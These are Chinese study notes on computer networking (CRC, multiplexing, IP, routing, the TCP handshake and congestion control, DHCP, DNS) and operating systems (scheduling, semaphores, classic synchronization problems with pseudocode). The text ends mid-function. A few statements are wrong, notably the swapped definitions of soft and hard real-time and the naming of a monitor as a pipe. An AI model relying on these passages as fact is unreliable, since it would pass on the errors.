# 计算机网络

## 链路层

### 基本问题

封装成帧：

> 将网络层的数据加上帧首部和尾部，表示数据帧的开始和结束

差错检测（CRC）

> 采用循环冗余（CRC）来检查比特错误
>
> 
>
>
> 发送方和接收方协商得到除数q，如果除数是五位数的话，那么余数r就是四位数。
>
> 假设原始数据是A的话，那么A = q*k + r
>
> 那么发送出去的数据B就是B = A + r
>
> 然后用B / q如果得到的结果是0的话，那么消息就是正确的，否则错误

### 信道分类

广播信道

> 所有节点都在一个信道上发送数据（容易产生冲突，所以需要专门的控制方法进行协调）
>
> 控制方法：信道复用技术，CSMA/CD协议

点对点信道

> 一对一通信，不要产生碰撞，使用PPP协议进行控制

### 信道复用技术

是为了解决广播信道的问题

频分复用

> 所有主机在==相同的时间==内占用==不同的频率带宽==资源

时分复用

> 所有主机在==不同的时间==占用==相同的频率带宽==资源（固定好顺序的例如ABCABC这样交替进行）

统计时分复用

> 对时分复用的改进，不固定顺序，例如数据够了据组成帧并发送

波分复用

> 利用不同波长的光信号在同一根光纤中传输多路信号

码分复用

> ==同时允许多个用户在同一频带同时发送各自的信号==
>
> ==所以一个用户会收到所有当前信道的信号，需要和自己的码片进行相乘，如果为0就不是自己的信号，如果是1，那么就是1，-1就是0==
>
> 为每个用户分配一个码片，且任意的两个码片正交
>
> 在计算的时候码片的0当成-1，1当成+1（例如 00011011 计算的时候就是（-1 -1 -1 +1 +1 -1 +1 +1））
>
> 如果码片为S，那么当用户要发送比特1的话就是发送S，用户要发送比特0的话，就发送码片的反码S'

### CSMA/CD协议

CSMA/CD表示载波监听多点接入/碰撞测试

> 载波监听表示每个主机都得不停的监听信道，发送数据前得查看信道是否被使用
>
> 多点接入表示主机以多点的方式连接到总线上
>
> 碰撞测试表示在发送的时候监听到信道上有其他主机在发送数据，那么就表示发生碰撞（因为存在传播时延）
>
> 
>
> 原理：
>
> 假设端到端的传播时延为t，那么2t就是争用期
>
> 当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 ==截断二进制指数退避算法==来确定。从离散的整数集合 {0, 1, .., (2k-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。

### PPP协议

PPP协议用于一对一通信

> 互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。
>
> 帧格式是F A C 协议 IP数据报 FCS F
>
> 
>
>
> 其中F表示帧的首尾
>
> A C无意义
>
> FCS用于进行CRC检验

### MAC地址

每个网络适配器都有一个MAC地址，用于唯一标识网络适配器（网卡）

### 局域网

局域网是典型的广播信道，主要有以太网，令牌环网，FDDI和ATM等局域网技术

按照网络拓朴结构，局域网分为星型，环型以及直线型

![image-20250405000006503](images/image-20250405000006503.png)

### 以太网

以太网就是星型拓扑结构局域网

早期用的是集线器，集线器是对比特进行操作而不是帧，现在用交换机代替集线器

以太网帧的格式

> 以太网帧格式：
>
> 目的地址 源地址 类型 IP数据报 FCS
>
> 类型标记上层使用的协议
>
> FCS进行CRC检验

### 交换机

交换机具有自学习的能力，学习的是交换表的内容，交换表中存储着MAC地址到交换机接口的映射

### 虚拟局域网

是为了解决交换机出现的广播帧的问题

通过将局域网从逻辑上划分成为多个小的虚拟局域网VLAN，VLAN之间无法直接互通所以广播的报文会被限制在一个VLAN里面

## 网络层

### 基础

使用IP协议可以将异构的物理网络连接起来，使得在网络层看起来是一个统一的网络

与IP协议配套使用的还有三个协议：

> 地址解析协议（ARP）：将IP地址转换成为MAC地址
>
> 网际控制报文协议（ICMP）：如果目标主机不可达，那么会通过路由器告诉源主机目标主机不可达
>
> 网际组管理协议（IGMP）：IGMP用于管理IP多播组的成员资格。通过IGMP，主机可以向所在网络的路由器报告自己希望加入或退出某个多播组，从而使得网络能有效地传送多播数据。

IP数据报格式

![image-20250405114230050](D:\typora图片\image-20250405114230050.png)

> **版本**：IPv4还是IPv6
>
> **首部长度**：指的是整个首部有多长，单位是32bit，例如0001等于1就表示整个首部的长度为32bit
>
> **区分服务**：一般不使用
>
> **总长度**：包括首部长度和数据部分的长度
>
> 
>
> **生存时间（TTL）**：指的是路由器的跳数，TTL=0则丢弃数据包
>
> 
>
> **协议**：表示数据包封装的是哪一种协议（TCP，UDP，ICMP）
>
> ==如果协议是ICMP的话，那么数据部分就是ICMP的数据==
>
>
> **标识**：数据长度过大需要切片的时候，相同数据报的不同分片具有相同的标识符
>
>
> **标志**：三位，第二位为是否允许分片，1则不能分片，最后一位表示如果分片是否有其他分片，0的话则表示这是数据报的最后一个分片
>
>
> **片偏移**：指的是当前分片的数据在原始数据中的开始位置
>
>
> **首部检验和**：当数据报每经过一个路由器，都要重新计算检验和，所以计算的时候不包含数据部分，减少计算的工作量

### IP地址编址方式

**分类IP地址**

![image-20250405154559236](D:\typora图片\image-20250405154559236.png)

> 分为ABCDE五个地址
>
> A类地址：8位网络号（0开头），24位主机号
>
> 
>
> B类地址：16位网络号（10开头），16位主机号
>
> 
>
> C类地址：24位网络号（110开头），8位主机号
>
> 
>
> D类地址：1110（开头）多播地址
>
> 
>
> E类地址：1111（开头）暂时还未使用

**子网划分**

==将主机字段拿一部分作为子网号==

> IP 地址 ::= {< 网络号 >, < 子网号 >, < 主机号 >}

**无分类**

无分类取消了地址ABCDE的分类，无分类叫做CIDR

> CIDR是在IP地址后面加上网络前缀的长度
>
>
> 128.14.35.7/20 表示的是前20位为网络号，后12位为主机号

### 地址解析协议ARP

ARP实现的是由IP地址得到对应的MAC地址

> 每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表

### 网际控制报文协议ICMP

ICMP是封装在IP数据部分的，不属于高层协议

前32bit（四个字节是统一的）

![image-20250405163613425](D:\typora图片\image-20250405163613425.png)

> **类型**表示的是差错报文还是询问报文
>
> 
>
> **代码**表示的是类型中的具体哪一个，因为类型里面还有划分
>
>
> **检验和**表示的是对数据进行校验，判断传输过程是否出错

Ping

> 原理：ping向目的主机发送ICMP Echo请求报文，目的主机收到后发送Echo回答报文

Traceroute

> 原理：源主机向目的主机发送一连串的数据报
> 
>
> 第一个数据报的TTL设置为1，当到达第一个路由器之后TTL-1=0，那么路由器就会将这个数据报丢弃，并发送不可达错误（这个相当于是路由器的相应），通过路由器的响应也可以知道源主机到达第一个路由器的时间。
>
> 
>
> 第二个数据报的TTL设置为2，数据报先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 数据报，并向源主机发送一个 ICMP 时间超过差错报文（用于丢弃数据报以及计算往返这个路由器的时间）。
> 
>
>
> 不断执行上述的步骤，到达目的主机的时候不将TTL减1，但是要想源主机发送ICMP不可达的错误报文。

### 虚拟专用网VPN

因为IP地址短缺，所以机构能申请到的IP地址的数量远远小于本机构拥有的主机数。并且机构内不需要所有的主机都接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的IP地址。

> 专用网指的是为通过专线或VPN隧道等方式保证安全和隔离，但本质上是一个**私有网络**，并不只指“为源主机和目的主机建立的专用信道”。
>
> 虚拟VPN技术一般采用的是加密和隧道技术
> 
>
> 可以实现两个具有内部私有地址的位于不同局域网的主机间的通信
>
> 例如：场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。

### 网络地址转换NAT

以前的NAT是本地IP对应一个全球IP，这样不够有效
现在的NAT是加入端口号，利用端口号标识主机内的不同主机，例如40001对应一个IP地址及端口，40002是另一个

![image-20250405180724269](D:\typora图片\image-20250405180724269.png)

### 路由器的结构

路由器的主要功能：路由选择，分组转发

路由器的典型结构

![image-20250405181105465](D:\typora图片\image-20250405181105465.png)

### 路由器分组转发

> 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N（分为下面几种情况）：
> 
>
>
> 如果N是与此路由器直接相连的网络地址，那么直接交付
>
> 
>
> 如果路由表中由目的主机D的特定主机路由，那么则将数据交给指明的下一跳路由器（这个是只针对一个IP的）
> 
>
>
> 如果路由表中有到达网络N的路由，那么则将数据报传送给指明的下一跳路由器（这个是针对一整个网段的）
>
>
> 如果路由表中有默认路由，那么就交给默认路由器
>
>
> 如果都没有则报告分组错误

### 路由选择协议

互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。

可以把路由选择协议划分为两大类：

- 自治系统内部的路由选择：RIP 和 OSPF
- 自治系统间的路由选择：BGP

**RIP路由协议**

RIP最大距离是15，限制网络的规模

> 1. 每隔 30 秒左右，路由器会向所有相邻路由器广播自己的完整路由表。报文中每条记录包含目的网络、距离（跳数）和下一跳。
>
> 2. 路由器收到来自相邻路由器 X 的 RIP 报文后，先做两件事：
>
>    - 将报文中每条记录的“下一跳”字段都改为 X（因为下一跳经由 X）
>    - 将所有记录的距离（跳数）都 +1（因为经过 X 多走了一跳）
>
> 3. 如果本地路由表中还没有目的网络 N，则直接将 `(N, d, 下一跳=X)` 添加进来。
>
>    如果路由表中已有到 N 的条目，且它的“下一跳”正是 X，那么说明这条路由就是通过 X 学来的，此时无论距离如何变化，都用新收到的 `(N, d, X)` 覆盖原条目，以保持最新的距离信息。
>
>    如果已有到 N 的条目是经由其他路由器 Y 的 `(N, d0, Y)`，而新收到的 `(N, d, X)` 中 `d < d0`，说明通过 X 能到 N 的距离更短，则将原条目更新为 `(N, d, X)`。、
>
> 4. 路由器会对每个相邻路由器设置一个计时器：
>
>    - 如果 **连续 3 分钟**（默认超时）未收到某个相邻路由器的 RIP 报文，就认为它失联。
>    - 对应路由器 X 失联后，将所有“下一跳=X”的路由条目的距离置为 **无限大（在 RIP 中定义为16跳）**，并保留条目以便将来可能的恢复。

**OSPF内部网关协议**

> OSPF 具有以下特点：
>
> - 向本自治系统中的所有路由器发送信息，这种方法是洪泛法。
> - 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。
> - 只有当链路状态发生变化时，路由器才会发送信息。
>
> 所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。

**BGP外部网关协议**

![image-20250405184427461](D:\typora图片\image-20250405184427461.png)

> AS 之间的路由选择很困难，主要是由于：
>
> - 互联网规模很大；
> - 各个 AS 内部使用不同的路由选择协议，无法准确定义路径的度量；
> - AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。
>
> BGP 只能寻找一条比较好的路由，而不是最佳路由。
>
> 每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。

## 传输层

网络层将分组送到目的主机，但是通信的是主机中的进程，传输层提供进程间的==逻辑通信==（指的是两个主机的进程看起来是在直接通信的，但是传输层不能在两个进程之间建立一条物理信道，所以是逻辑信道）

### UDP

![image-20250405202647364](D:\typora图片\image-20250405202647364.png)

===伪首部不会传输出去，只会作为计算。==会将伪首部 + UDP头 + 数据 + 检验和得到全1的结果，然后将这个检验和加进数据报中，接收端通过计算检验和以及重新拼接成为的伪首部等看看结果是否是全1，是的话则说明数据报没有发生问题。

### TCP

![image-20250405215833133](D:\typora图片\image-20250405215833133.png)

TCP给进程分配端口，例如发送端端口随机为51232，然后接收端的https端口是443/http端口是80

> 序号：用于对字节进行编号，表示数据中第一个字节的编号是多少
>
>
> 确认号：期望收到的下一个报文段的序号
>
>
> 数据偏移：指的是数据部分距离报文起始位置的偏移量，其实就是首部的长度
>
>
> 确认ACK（不是确认号ack）：ACK=1则确认字号有效否则无效，在连接建立后所有传送的报文段都必须把 ACK置1
>
>
> 同步SYN：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1
>
>
> 终止FIN：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。
>
>
> 窗口：由接收方决定的，接收方每发送一个确认号，里面就会告诉发送方缓存区内还能接收多少数据

### TCP三次握手

![image-20250405221030573](D:\typora图片\image-20250405221030573.png)

> 1. 发送方发送SYN=1，ACK=0，并选择一个初始序号x
> 2. 接收方接收信息后，如果同意连接的话就会向发送方发送SYN=1，ACK=1，ack=x+1，同时选择一个初始序号y
> 3. 发送方收到接收方的连接确认报文后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。

**为什么需要三次握手呢**

> 为了防止失效的请求到达服务器，让服务器错误的打开连接
>
> 客户端发送的请求在网络中耽误了，所以就会很久才会受到服务端发挥的确认，如果在一个超时重传时间后客户端还没有收到确认后就会重新发送请求，如果没有三次握手的话，服务器就会打开两个连接，如果有三次握手就会服务器发送的对于滞留请求的连接确认。

### TCP四次挥手

![image-20250405221503025](D:\typora图片\image-20250405221503025.png)

> 1. 发送端发送连接释放报文，将FIN=1，seq=u（这里的u是最后一个数据报的相对位置）
> 2. 服务器接收到后发出确认，此时TCP属于半关闭状态，服务器还可以向客户端发送消息，但是客户端无法向服务器发送消息
> 3. 当 B 不再需要连接时，发送连接释放报文，FIN=1
> 4. A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接
> 5. B 收到 A 的确认后释放连接

**四次挥手的原因**

> 防止服务器还有数据没有传输完，传输完成后，服务器就会发送FIN信号释放连接

**等待2个TIME_WAIT的原因**

> - 担心客户端发送的确认号服务端没有收到，那么服务器机会再次发送连接释放请求报文
> - 等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。

### TCP滑动窗口

窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。

> ==发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。==如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。
>
> ==接收窗口只会对窗口内最后一个按序到达的字节进行确认==，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。

### TCP流量控制

流量控制是为了控制发送方发送速率，保证接收方来得及接收。

接收方来决定发送方发送数据的速率

### TCP拥塞控制

> TCP流量控制是接收方告诉发送方自己还可以接收多少数据，而拥塞控制是发送方根据当前网络的拥堵程度自己决定拥塞窗口的大小
>
> **发送方窗口的大小=min（接收方通告窗口，拥塞窗口）**

发送方维护一个拥塞窗口（cwnd）的状态变量

![image-20250405224233093](D:\typora图片\image-20250405224233093.png)

拥塞窗口在不同阶段的变化如上图所示

> 1. 先执行慢开始与拥塞避免
>
> 刚刚开始的时候将cwnd设置为1，收到确认后，cwnd设置为2，收到确认后，cwnd设置为4然后8以此类推
>
> 这样cwnd会增长的很快，要设置一个阈值ssthresh，当cwnd > ssthresh的时候，进入拥塞避免，每次cwnd只加1
>
> 如果出现超时的话，那么ssthresh = cwnd/2，然后重新执行慢开始
>
> 2. 快重传和快恢复（快重传和快恢复是配套进行的，快重传完了之后马上变成快恢复）
>
> 在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。
>
> 在发送方，如果收到==三个重复确认==，那么可以知道下一个报文段丢失，此时执行快重传，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。
>
> 在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令 ssthresh = cwnd / 2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。
>
> **慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh。**

## 应用层

### DNS域名解析协议

DNS提供主机名和IP地址之间相互转换的服务

DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。

### FTP文件传输协议

FTP 使用 TCP 进行连接，它需要两个连接来传送一个文件：

- 控制连接：服务器打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。
- 数据连接：用来传送一个文件数据。

> 根据数据连接是否是服务器端主动建立，FTP 有主动和被动两种模式：
>
> 主动模式要求客户端开放端口号给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是被动模式会导致服务器端的安全性减弱，因为开放了过多的端口号。

![image-20250405225702910](D:\typora图片\image-20250405225702910.png)

### DHCP动态主机配置协议

**自动为主机分配 IP 地址及相关网络参数（如网关、DNS、子网掩码等）**

> 1. 客户端发送 Discover 报文，该报文的目的地址为 255.255.255.255:67，源地址为 0.0.0.0:68，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。
> 2. DHCP 服务器收到 Discover 报文之后，发送 Offer 报文给客户端，该报文包含了客户端所需要的信息。因为客户端==可能收到多个 DHCP 服务器提供的信息==，因此客户端需要进行选择。
> 3. 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 Request 报文给该 DHCP 服务器。
> 4. DHCP 服务器发送 Ack 报文，表示客户端此时可以使用提供给它的信息。

![image-20250405225940503](D:\typora图片\image-20250405225940503.png)

### TELNET远程登陆协议

TELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。

### 电子邮件协议

邮件协议包含发送协议和读取协议，**发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。**采用的是TCP连接。

![image-20250405230446524](D:\typora图片\image-20250405230446524.png)

###  SMTP

SMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。

MIME 并没有改动或者取代 SMTP，而是可以将用户输入的非ASCII码转换成为ASCII码

![image-20250405230615727](D:\typora图片\image-20250405230615727.png)

### POP3

POP3特点是用户如果从服务器中读取了邮件之后，就会将邮件删除

### IMAP

IMAP 协议中客户端和服务器上的邮件保持同步，如果不手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。

### 常用端口

![image-20250405231441965](D:\typora图片\image-20250405231441965.png)

### WEB页面请求过程

**1. DHCP 自动获取网络配置**

- 主机开机时没有 IP 地址，使用 DHCP 协议向局域网广播请求（目的 IP 为 255.255.255.255，MAC 为 FF:FF:FF:FF:FF:FF）。
- DHCP 服务器接收到后，回应 DHCP ACK 包，分配 IP 地址、子网掩码、默认网关、DNS 等信息。
- 主机收到后配置网络参数，并将默认网关添加到自己的路由表中。

**2. ARP 获取网关 MAC 地址**

- 主机想发 DNS 查询，目标是 DNS 服务器的 IP，但不知道默认网关的 MAC 地址。
- 使用 ARP 协议广播请求，询问“谁是这个 IP？”。
- 网关响应 ARP Reply，主机获得网关 MAC地址。

**3. DNS 解析域名**

- 主机向 DNS 服务器发送 DNS 查询（UDP 53端口），请求解析域名为 IP 地址。
- 数据包通过网关、路由器转发到 DNS 服务器。
- DNS 服务器查询数据库，返回解析结果（目标网站 IP 地址）给主机。

**4. 建立 TCP 连接，发起 HTTP 请求**

- 主机使用解析到的 IP 地址与 Web 服务器建立 TCP 连接（三次握手）。
- 握手完成后，浏览器发送 HTTP GET 请求（目标端口 80）。
- Web 服务器处理请求，返回 HTTP 响应，包含网页内容。

**5. 显示网页**

- 主机接收到 HTTP 响应，浏览器提取网页数据并渲染显示。

# 操作系统



## 概述

### 基本概念

**并发和并行**

> 并发指的是同一个宏观时间内能运行多个程序（单个CPU）
>
> 并行指的是同一时刻能运行多个指令（多个CPU）

**共享**

> 共享是指系统中的资源可以被多个并发进程共同使用。
> 
>
>
> 共享分为互斥共享和同时共享
>
> 互斥共享：资源只能被一个线程使用，所以互斥共享的资源叫做临界资源（CPU，写文件等操作）
> 同时共享：多个线程可以在同一时间访问资源，不会相互影响（查配置，读缓存等操作）

**虚拟**

> 虚拟技术是将一个物理实体转换成为多个逻辑实体
>
> 虚拟技术主要有：时分复用和空分复用
> 
>
>
> 多个进程能在一个处理器上并发执行用的是时分复用技术
>
> 虚拟内存采用的是空分复用技术

**异步**

> 异步指的是进程不是一次性执行完的，而是走走停停，以不可知的速度向前推进

### 基本功能

**进程管理**

> 进程控制、进程同步、进程通信、死锁处理、处理机调度等

**内存管理**

> 内存分配、地址映射、内存保护与共享、虚拟内存等

**文件管理**

> 文件存储空间管理，目录管理、文件读写管理和保护等

**设备管理**

> 完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。
>
> 主要包括缓冲管理、设备分配、设备处理、虛拟设备等。

### 系统调用

系统调用将用户态切换为内核态，这个过程由操作系统处理，叫做系统调用（**从内核态到用户态不是系统调用**）

![image-20250407212307372](D:\typora图片\image-20250407212307372.png)



|   Task   | Commands                    |
| :------: | --------------------------- |
| 进程控制 | fork(); exit(); wait();     |
| 进程通信 | pipe(); shmget(); mmap();   |
| 文件操作 | open(); read(); write();    |
| 设备操作 | ioctl(); read(); write();   |
| 信息维护 | getpid(); alarm(); sleep(); |
|   安全   | chmod(); umask(); chown();  |

用户态和内核态需要频繁切换的原因

> 用户程序不能直接操作硬件或内存管理单元，只能请求内核代为执行，因此它**必然需要进入内核态**，但用完就走，**还得回来继续跑自己的代码**，所以就构成了这个经典的来回切换路径。

### 宏内核和微内核

> 宏内核：操作系统的所有核心功能都在内核态进行（运行速度快但是容易崩）
>
> 微内核：除了必要的功能在内核态运行，其他功能都在用户态运行（安全但是容易发生频繁的系统调用）

### 中断分类

**外中断**

> **外中断**是由**CPU 外部设备**发出的中断请求，
>  用于**提醒 CPU 有外部事件需要处理**，比如键盘输入、鼠标点击、网络数据到达等。
>
> 把 CPU 比作“大脑”，那么==外部设备==就是大脑的“感官和四肢”：
>
> - 键盘、鼠标 → 输入设备（手指/眼睛）
> - 显示器、打印机 → 输出设备（嘴/手）
> - 硬盘、SSD、内存 → 存储设备（记忆）
> - 网卡、声卡、定时器 → 通信/感知/调度模块

**异常**

> 由 CPU 执行指令的==内部事件==引起，如非法操作码、地址越界、算术溢出等。

**陷入**

> 陷入（Trap）是一种“由程序主动发起的中断”，例如系统调用等

## 进程管理

### 进程和线程

**进程**

> 进程是==资源分配==的基本单位
>
> 进程控制（PCB）描述进程的基本信息和运行状态，创建和撤销进程就是对PCB进行操作

**线程**

> 线程是==独立调度==的基本单位
>
> 一个进程可以有多个线程，它们共享进程资源
>
> 例如：QQ和浏览器是两个进程，浏览器里面有很多线程，例如HTTP请求线程、事件响应线程等

**区别**

> 1. 进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问进程的资源
>
> 2. 线程是调度得到基本单位，在一个进程内，线程的切换不会引起进程切换，但是从一个进程中的线程到另一个进程中的线程就会引起进程切换
>
> 3. 创建或撤销进程，系统都要为之分配或回收资源，如内存空间、I/O设备等。撤销线程的时候只需要将其从调度队列中删除、释放线程的栈空间以及清理线程私有数据。所以创建和删除进程的开销比创建或删除线程的开销大多了。在进行进程切换的时候需要执行CPU环境的保存和新进程CPU环境的设置，而线程切换只需保存以及设置少量寄存器，开销小
> 4. 同一个进程中的线程间可以直接读取进程中的数据进行通信，但是进程通信需要借助IPC。所以不同的进程中的线程进行通信需要借助的是IPC即进程间通信。

### 进程状态的切换

就绪态：等待CPU资源

运行态：正在占用CPU资源

阻塞态：等待除了CPU以外的其他资源（I/O等）

就绪态和运行态是可以相互转换的，其他的都是单向转换

![img](D:\typora图片\ProcessState.png)

### 进程调度算法

需要根据==用户操作多还是少==来讨论调度算法

**批处理系统（用户操作少）**

> 1. 先来先服务
>
> 非抢占式的调度算法，按照请求的顺序进行调度，有利于长作业但是不利于短作业。因为短作业要一直等到长作业执行完。
>
> 2. 短作业优先
>
> 非抢占式的调度算法，运行时间最短的作业优先，长作业有可能会饿死，有短作业来，那么长作业就会一直得不到调度。
>
> 3. 最短剩余时间优先
>
> 抢占式的调度算法，按剩余运行时间的顺序进行调度。对短作业比较友好，长作业可能会一直等。

**交互式系统（有大量的用户交互操作）**

> 1. 时间片轮转
>
> 将所有就绪进程按FCFS的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首进程。
>
> （时间片轮转和时间片的大小有关系，时间片太小会导致进程）
>
> 2. 优先级调度
>
> 为每一个进程分配一个优先级，按优先级进行调度
>
> 为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级
>
> 3. 多级反馈队列
>
> 多级反馈队列通过多层优先级队列+时间片调度+动态降级（或升级）机制，智能地区分短作业和长作业

**实时系统**

> 实时系统要求一个请求在一个确定时间内得到响应
>
> 分为软实时和硬实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时

### 进程同步

**临界区**

> 对临界资源进行访问的那段代码成为临界区，为了互斥访问临界资源，每个进程在进入临界区之前都需要进行检查

**同步和互斥**

> 同步：多个进程因为合作关系产生的直接制约关系，使得进程有一定的先后执行关系
>
> 互斥：多个进程在同一时刻只有一个进程可以进入临界区

**信号量**

信号量是一个整型变量，可以对其执行down和up操作，也就是P和V操作

> down：如果信号量大于0则减1；如果信号量等于0，则进程睡眠，等待信号量大于0
>
> up：对信号量执行加1操作，唤醒睡眠的进程
> 
>
> down是请求资源
>
> up是释放资源
>
>
> 如果信号量的取值是==0 / 1==，那么就变成==互斥量==，0表示临界区已经加锁，1表示临界区解锁

**使用信号量实现生产者-消费者问题**

生产者消费者问题是：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品

> 缓冲区属于临界资源，所以需要一个互斥量mutex来控制对缓冲区的访问
>
> 使用两个信号量来记录缓冲区的数量，empty记录空缓冲区的数量（还可以放多少东西），full记录满缓冲区的数量（还有多少东西没被取走）
>
>
> 当empty不为0的时候，生产者才可以放入东西；当full不为0的时候，消费者才可以取走东西。
>
>
> 注意：
>
> ==1. 不能对缓冲区先加锁再测试信号量，这是因为如果先对临界区加锁的话，如果empty=0或者full=0的话就会导致线程会一直等待，但是此时临界区已经被上锁了，其他进程想要加入东西或者取走东西也无法实现，会陷入死锁==
>
> ==2. up(mutex)和up(full)是可以调换顺序的，不会影响正确性的。但是建议先释放锁再唤醒进程（先up(mutex)再up(full)），如果先唤醒进程再释放锁（up(full)再up(mutex)）的话会导致进程被唤醒后等待进入临界区，增加等待时间==

伪代码如下：

```python
mutex = 1
empty = N
full = 0
    
def producer(){
	down(empty)
    down(mutex)
    do something...
    up(mutex)
    up(full)
  }

def consumer(){
    down(full)
    down(mutex)
    do smoething...
    up(mutex)
    up(empty)
}
```

**管道**

使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。下面是用pascal语言实现一个管道

```pascal
// 定义一个管道，然后里面封装着缓冲区、计数器和对它们的操作
monitor ProducerConsumer
    condition full, empty;
    integer count := 0;
    condition c;

    procedure insert(item: integer);
    begin
        if count = N then wait(full);
        insert_item(item);
        count := count + 1;
        if count = 1 then signal(empty);
    end;

    function remove: integer;
    begin
        if count = 0 then wait(empty);
        remove = remove_item;
        count := count - 1;
        if count = N -1 then signal(full);
    end;
end monitor;

// 生产者客户端，调用定义的管道函数
procedure producer
begin
    while true do
    begin
        item = produce_item;
        ProducerConsumer.insert(item);
    end
end;

// 消费者客户端，调用定义的管道函数
procedure consumer
begin
    while true do
    begin
        item = ProducerConsumer.remove;
        consume_item(item);
    end
end;
```

### 经典同步问题

**哲学家就餐问题**

五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。

> 思路是:
>
> 1. 先检查自己本身是不是处于饥饿状态并且左右邻居都不是吃饭状态，是的话则唤醒自己
> 2. 拿起筷子的时候先拿锁，然后修改自身状态为hungry，并调用检查函数，检查是否可以进食，不行的话就阻塞自己，释放锁
> 3. 放下筷子的时候先拿锁，并修改自身状态为thinking，并调用检查函数，检查左右邻居，告诉左右邻居自己吃好了，释放锁

```python
n = 5
mutex = 1
left = (i + n - 1) % n
right = (i + 1) % n


def check(i){
    if state[i] == hungry and state[left] != eating and state[right] != eating:
        up(s[i])
}

def take(i){
    down(mutex)
    state[i] = hungry
    check(i)
    up(mutex)
    down(s[i])
}

def put(i){
    down(mutex)
    state[i]= thinking
    check(left)
    check(right)
    up(mutex)
}
```

**读者写者问题**

允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。

> 思路是：
>
> 1. 使用一个count来记录读者的数量，并且用count_mutex锁对count进行加锁，控制加1和减1的操作
> 2. 使用一个data_mutex实现对缓冲区读和写操作的加锁

```python
count = 0
count_mutex = 1
data_mutex = 1

def read(){

    while True:
        down(count_mutex)
        count += 1
        if count == 1:
            down(data_mutex)
        up(count_mutex)
        
        do_read()
        
        down(count_mutex)
        count -= 1
        if count == 0:
            up(data_mutex)
        up(count_mutex)
}

def write(){
    while True:
        down(data_mutex)
